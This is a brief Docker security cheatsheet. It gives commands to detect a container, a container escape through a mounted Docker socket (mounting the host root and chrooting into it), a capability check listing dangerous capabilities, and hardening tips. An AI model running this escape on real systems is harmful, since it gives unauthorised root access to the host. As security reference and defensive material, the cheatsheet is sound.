# Docker Security Cheatsheet

## Container Escape Techniques
```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
```

## Docker Socket Escape
```bash
# If /var/run/docker.sock is mounted
docker run -v /:/host -it ubuntu chroot /host
```

## Capabilities Check
```bash
capsh --print
# Dangerous caps: SYS_ADMIN, SYS_PTRACE, DAC_READ_SEARCH
```

## Hardening
- Use non-root user in Dockerfile
- Drop all capabilities, add only needed
- Use read-only filesystem
- Scan images with Trivy or Snyk
- Use multi-stage builds
- Never hardcode secrets in images